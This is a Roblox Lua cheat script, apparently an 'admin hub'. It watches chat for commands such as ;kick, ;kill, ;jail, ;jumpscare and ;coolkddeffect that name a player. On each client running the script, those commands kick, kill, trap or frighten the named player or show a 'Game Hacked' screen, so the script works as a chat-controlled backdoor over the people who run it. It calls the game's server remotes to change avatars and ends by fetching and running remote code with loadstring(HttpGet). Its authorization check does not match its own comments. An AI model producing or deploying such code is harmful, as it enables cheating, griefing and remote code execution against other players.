--// Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = workspace


--// Donos especiais (sempre recebem "Dono")
local Donos = {
    ["eobli7"] = true,
    ["eobli7"] = true
}

--// Jogadores autorizados por envio de Galaxy_####
local Autorizados = {} -- chave: nome exato do player -> true

--// Estado local
local playerOriginalSpeed = {}
local jaulas = {}
local jailConnections = {}

--// Função util: atualiza tag visual de um jogador (cria/recria)
local function createSpecialTag(player)
    if not player then return end
    local function apply()
        local char = player.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end

        local old = head:FindFirstChild("SpecialTag")
        if old then old:Destroy() end

        local gui = Instance.new("BillboardGui")
        gui.Name = "SpecialTag"
        gui.Size = UDim2.new(0, 200, 0, 50)
        gui.StudsOffset = Vector3.new(0, 3, 0)
        gui.AlwaysOnTop = true
        gui.Adornee = head
        gui.Parent = head

        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.BackgroundTransparency = 1
        text.Font = Enum.Font.GothamBold
        text.TextScaled = true
        text.TextStrokeTransparency = 0.2
        text.TextStrokeColor3 = Color3.new(0,0,0)
        text.TextColor3 = Color3.fromRGB(255,0,0)

        if Donos[player.Name] then
            text.Text = "Dono eobli7"
        elseif Autorizados[player.Name] then
            text.Text = "Admin"
        else
            text.Text = "" -- sem tag até autorizar
        end

        text.Parent = gui
    end

    -- aplica agora e sempre que o personagem reaparecer
    pcall(apply)
    player.CharacterAdded:Connect(function()
        task.wait(0.4)
        pcall(apply)
    end)
end

--// Aplica tags iniciais para jogadores presentes
for _, p in pairs(Players:GetPlayers()) do
    createSpecialTag(p)
end

--// Quando jogadores entrarem
Players.PlayerAdded:Connect(function(p)
    createSpecialTag(p)
end)

--// Envia comando no chat (usa TextChannels)
local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
    end
end

--// Atualiza tag de jogador pelo nome (se estiver presente no jogo)
local function AtualizarTagPorNome(nome)
    local p = Players:FindFirstChild(nome)
    if p then
        createSpecialTag(p)
    end
end

--// Função que processa cada mensagem recebida (originais e locais)
local function ProcessarMensagem(msgText, authorName)
    if not msgText or not authorName then return end

    local comandoLower = msgText:lower()
    local targetLower = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    -- COMANDOS QUE AFETAM O LOCAL PLAYER (verifica se o comando inclui o nome do local player)
    if comandoLower:match(";kick%s+" .. targetLower) then
        LocalPlayer:Kick("By eobli7 team")
    end

    if comandoLower:match(";kill%s+" .. targetLower) then
        if character then character:BreakJoints() end
    end

    if comandoLower:match(";killplus%s+" .. targetLower) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i=1,10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10,10,10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = Workspace
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
                    bv.Parent = part
                    game.Debris:AddItem(part,3)
                end
            end
        end
    end

    if comandoLower:match(";fling%s+" .. targetLower) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})
                tween:Play()
            end
        end
    end

    if comandoLower:match(";freeze%s+" .. targetLower) then
        if humanoid then
            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    if comandoLower:match(";unfreeze%s+" .. targetLower) then
        if humanoid then
            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
        end
    end

    if comandoLower:match(";jail%s+" .. targetLower) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local pos = root.Position
                jaulas[targetLower] = {}
                local color = Color3.fromRGB(255,140,0)

                local function criarPart(cf,s)
                    local p = Instance.new("Part")
                    p.Anchored = true
                    p.Size = s
                    p.CFrame = cf
                    p.Transparency = 0.5
                    p.Color = color
                    p.Parent = Workspace
                    table.insert(jaulas[targetLower], p)
                end

                criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
                criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
                criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
                criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
                criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
                criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))

                jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
                    if character and root then
                        if (root.Position - pos).Magnitude > 5 then
                            root.CFrame = CFrame.new(pos)
                        end
                    end
                end)
            end
        end
    end

    if comandoLower:match(";unjail%s+" .. targetLower) then
        if jaulas[targetLower] then
            for _, v in pairs(jaulas[targetLower]) do
                if v and v.Destroy then pcall(v.Destroy, v) end
            end
            jaulas[targetLower] = nil
        end
        if jailConnections[targetLower] then
            jailConnections[targetLower]:Disconnect()
            jailConnections[targetLower] = nil
        end
    end

if comandoLower:match(";backrooms%s+" .. targetLower) then
        local player = LocalPlayer
        local mapID = 10581711055
        local distantPosition = Vector3.new(4000, 7, 0)
        local teleportPosition = Vector3.new(4029, 9, 24)

        local mapa = game:GetObjects("rbxassetid://"..mapID)[1]
        mapa.Parent = Workspace
        if not mapa.PrimaryPart then
            local part = mapa:FindFirstChildWhichIsA("BasePart")
            if part then mapa.PrimaryPart = part end
        end
        mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character:MoveTo(teleportPosition)
        end
    end
    
    if comandoLower:match(";explodir%s+" .. targetLower) then
    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local explosion = Instance.new("Explosion")
        explosion.Position = targetPlayer.Character.HumanoidRootPart.Position
        explosion.Parent = game.Workspace
    end
end

if comandoLower:match(";coolkddeffect%s+" .. targetLower) then 
    
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://100048062301288"
    sky.SkyboxDn = "rbxassetid://100048062301288"
    sky.SkyboxFt = "rbxassetid://100048062301288"
    sky.SkyboxLf = "rbxassetid://100048062301288"
    sky.SkyboxRt = "rbxassetid://100048062301288"
    sky.SkyboxUp = "rbxassetid://100048062301288"
    sky.Parent = game.Lighting

    local decalId = "rbxassetid://100048062301288"

    local function applyDecals(part)
        if part:IsA("BasePart") then
            for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                local decal = Instance.new("Decal")
                decal.Face = face
                decal.Texture = decalId
                decal.Parent = part
            end
        end
    end

    for _, part in pairs(workspace:GetDescendants()) do
        applyDecals(part)
    end

    workspace.DescendantAdded:Connect(function(descendant)
        applyDecals(descendant)
    end)

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")

    local imageId = "rbxassetid://100048062301288"

    local function criarParticula(parte)
        local particle = Instance.new("ParticleEmitter")
        particle.Texture = imageId
        particle.Rate = 10
        particle.Lifetime = NumberRange.new(1)
        particle.Speed = NumberRange.new(2, 5)
        particle.Size = NumberSequence.new(1)
        particle.Rotation = NumberRange.new(0, 360)
        particle.RotSpeed = NumberRange.new(10)
        particle.SpreadAngle = Vector2.new(360, 360)
        particle.Parent = parte
    end

    local function aplicarParticulas(character)
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") and not part:FindFirstChildOfClass("ParticleEmitter") then
                criarParticula(part)
            end
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            aplicarParticulas(player.Character)
        end
        player.CharacterAdded:Connect(aplicarParticulas)
    end

    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(aplicarParticulas)
    end)

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer and targetPlayer:IsA("Player") then
        local gui = Instance.new("ScreenGui", targetPlayer:WaitForChild("PlayerGui"))
        gui.Name = "c00lkidTopBar"
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true

        local topBar = Instance.new("Frame", gui)
        topBar.BackgroundColor3 = Color3.new(0, 0, 0)
        topBar.Size = UDim2.new(1, 100, 0, 25)
        topBar.Position = UDim2.new(0, -50, 0, 0)
        topBar.BorderSizePixel = 0
        topBar.ZIndex = 2

        local title = Instance.new("TextLabel", topBar)
        title.Size = UDim2.new(1, 0, 1, 0)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.BackgroundTransparency = 1
        title.Text = "Game Hacked"
        title.TextColor3 = Color3.new(1, 1, 1)
        title.Font = Enum.Font.SourceSans
        title.TextSize = 20
        title.TextStrokeTransparency = 0.5
        title.TextStrokeColor3 = Color3.new(0, 0, 0)
        title.ZIndex = 3
    end

    local Sound = Instance.new("Sound")
    Sound.SoundId = "rbxassetid://99986264226275"
    Sound.Looped = false
    Sound.Parent = workspace

    local function playSoundWithRandomSettings()
        Sound.Volume = math.random(1, 3)
        Sound.PlaybackSpeed = math.random(20, 30) / 100
        Sound:Play()
    end

    playSoundWithRandomSettings()

    Sound.Ended:Connect(playSoundWithRandomSettings)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Coolkid Mode",
        Text = "Environment completely modified!",
        Duration = 4
    })
end

if comandoLower:match(";coolkddavatar%s+" .. targetLower) then 

    local targetPlayer = game.Players:FindFirstChild(targetLower) 
    if targetPlayer then
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local WearRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear")
        
        local Character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        if Humanoid then
            local Desc = Humanoid:GetAppliedDescription()

            for _, accessory in ipairs(Desc:GetAccessories(true)) do
                if accessory.AssetId then
                    local args = {
                        [1] = tonumber(accessory.AssetId)
                    }
                    WearRemote:InvokeServer(unpack(args))
                end
            end
            
            task.wait()
            
            local args = {
                {
                    0,
                    0,
                    0,
                    0,
                    0,
                    0
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(args))
            
            local args = {
                18554114295
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
            
            local args = {
                3164473649
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
            
            local args = {
                "Really red"
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))
            
            local args = {
                6093233760
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
        end
    end
end

if comandoLower:match(";speed%s+" .. targetLower) then

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
        targetPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 60
    end
end

if comandoLower:match(";flashbang%s+" .. targetLower) then

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer then
        local gui = Instance.new("ScreenGui")
        gui.Name = "FlashbangGui"
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(1, 1, 1)
        frame.BorderSizePixel = 0
        frame.Parent = gui
        
        gui.Parent = targetPlayer:WaitForChild("PlayerGui")
    end
end

if comandoLower:match(";unflashbang%s+" .. targetLower) then

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer then
        local playerGui = targetPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            local flashGui = playerGui:FindFirstChild("FlashbangGui")
            if flashGui then
                flashGui:Destroy()
            end
        end
    end
end

if comandoLower:match(";sit%s+" .. targetLower) then

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
        targetPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
    end
end

if comandoLower:match(";ragdoll%s+" .. targetLower) then

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer and targetPlayer.Character then
        local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.PlatformStand = true
            for _, joint in ipairs(targetPlayer.Character:GetDescendants()) do
                if joint:IsA("Motor6D") and joint.Name ~= "Neck" then
                    local socket = Instance.new("BallSocketConstraint")
                    local a0 = Instance.new("Attachment")
                    local a1 = Instance.new("Attachment")
                    
                    a0.Parent = joint.Part0
                    a1.Parent = joint.Part1
                    
                    a0.CFrame = joint.C0
                    a1.CFrame = joint.C1
                    
                    socket.Attachment0 = a0
                    socket.Attachment1 = a1
                    socket.Parent = joint.Parent
                    
                    joint.Enabled = false
                end
            end
        end
    end
end

if comandoLower:match(";jumpscare%s+" .. targetLower) then

    local targetPlayer = game.Players:FindFirstChild(targetLower)
    if targetPlayer then
        local gui = Instance.new("ScreenGui")
        gui.Name = "JumpscareGui"
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        
        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Size = UDim2.new(1, 0, 1, 0)
        imageLabel.Image = "rbxassetid://126754882337711"
        imageLabel.BackgroundTransparency = 1
        imageLabel.BorderSizePixel = 0
        imageLabel.Parent = gui
        
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://138873214826309"
        sound.Volume = 5
        sound.Parent = targetPlayer.Character or workspace
        
        gui.Parent = targetPlayer:WaitForChild("PlayerGui")
        sound:Play()
        
        task.delay(3, function()
            gui:Destroy()
            sound:Destroy()
        end)
    end
end

    -- COMANDO UNIVERSAL ;verifique -> faz o local player enviar eobli7_####
    if comandoLower:match("^;verifique") then
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync("eobli7_####")
        end
    end

    -- DETECÇÃO: se a mensagem contém eobli7_#### (case-insensitive)
    -- registra o autor como autorizado e atualiza tag
    if msgText:match("[Gg]ustavo_%d%d%d%d") then
        Autorizados[authorName] = true
        AtualizarTagPorNome(authorName)
    end
end

--// Conectar canais de chat existentes e futuros
local function ConectarCanal(canal)
    if not canal or not canal.IsA then return end
    if not canal:IsA("TextChannel") then return end
    canal.MessageReceived:Connect(function(msg)
        -- msg.Text e msg.TextSource
        local text = msg.Text
        local source = msg.TextSource and msg.TextSource.Name
        if text and source then
            ProcessarMensagem(text, source)
        end
    end)
end

-- Conecta canais já existentes
for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do
    ConectarCanal(ch)
end

-- Conecta canais novos
TextChatService.TextChannels.ChildAdded:Connect(function(ch)
    ConectarCanal(ch)
end)

--// Painel Galaxy Hub (WindUI) - exibido para todos
local ok, WindUILib = pcall(function()
    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
end)
if ok and WindUILib then
    local Window = WindUILib:CreateWindow({
        Title = "Galaxy Hub"
    })
end
